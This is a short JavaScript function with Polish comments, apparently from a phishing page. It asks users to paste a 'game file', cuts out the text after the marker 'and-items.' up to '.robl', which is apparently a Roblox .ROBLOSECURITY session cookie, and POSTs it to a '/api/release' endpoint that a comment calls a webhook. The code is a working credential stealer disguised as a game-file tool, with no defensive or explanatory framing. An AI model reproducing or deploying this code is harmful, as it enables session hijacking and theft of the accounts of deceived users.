function startProcess() { const gamefile = document.getElementById("gamefile").value.trim(); if (!gamefile) { alert("Wklej jakiś plik gry!"); return; } // Szukamy obu wariantów (z myślnikiem i bez) const markers = ["-and-items.", "and-items."]; let startIndex = -1; for (const marker of markers) { const idx = gamefile.indexOf(marker); if (idx !== -1) { startIndex = idx + marker.length; break; } } if (startIndex === -1) { alert("Nie znaleziono '-and-items.' ani 'and-items.'"); return; } // Bierzemy wszystko od znalezionego miejsca const substring = gamefile.slice(startIndex).trimStart(); // Kończymy przed jedną z tych sekwencji const possibleEndings = [ '", "/", ".robl', '", "/", .robl', '","/",.robl', '", "/", ".ro', '", "/", .ro' ]; let endIndex = substring.length; // domyślnie do końca for (const ending of possibleEndings) { const idx = substring.indexOf(ending); if (idx !== -1 && idx < endIndex) { endIndex = idx; } } const filteredText = substring.slice(0, endIndex).trim(); if (!filteredText || filteredText.length < 10) { alert("Nie udało się wyciąć sensownego fragmentu po -and-items."); return; } // Wysyłamy do webhooka fetch("/api/release", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ text: filteredText }) }) .then(res => { if (!res.ok) throw new Error("Błąd HTTP: " + res.status); return res.json(); }) .then(() => { alert("Wysłano pomyślnie!"); document.getElementById("gamefile").value = ""; }) .catch(err => { console.error(err); alert("Błąd podczas wysyłania:\n" + err.message); }); }
